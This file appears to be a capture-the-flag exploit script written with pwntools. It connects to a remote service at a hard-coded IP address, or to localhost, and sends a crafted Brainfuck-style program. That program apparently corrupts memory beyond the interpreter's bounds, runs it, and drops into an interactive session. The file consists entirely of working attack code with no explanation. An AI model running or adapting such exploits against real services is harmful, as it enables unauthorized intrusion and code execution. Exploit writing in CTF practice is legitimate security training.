from pwn import *

if "--remote" in sys.argv:
  p = remote("58.229.240.181", 7777)
else:
  #p = process(["python3", "main.py"])
  p = remote("localhost", 7777)

off = 0x40

p.sendlineafter(">>>", "[]" + "<" * 0x78 + "[" + "+" * (0x8c - 0x40) + ">" * off + "]"
  + "<" * (off - 1) + "[" + "+" * (0xc3 - 0x21) + ">" * off + "]"
  + "<" * (off - 1) + "[" + "-" * (0x44 - 0x43) + ">" * off + "]"
  #+ "<" * (off - 3) + "[" + "+" + ">" * off + "]"
  )

p.sendlineafter(">>>", ".")


p.interactive()
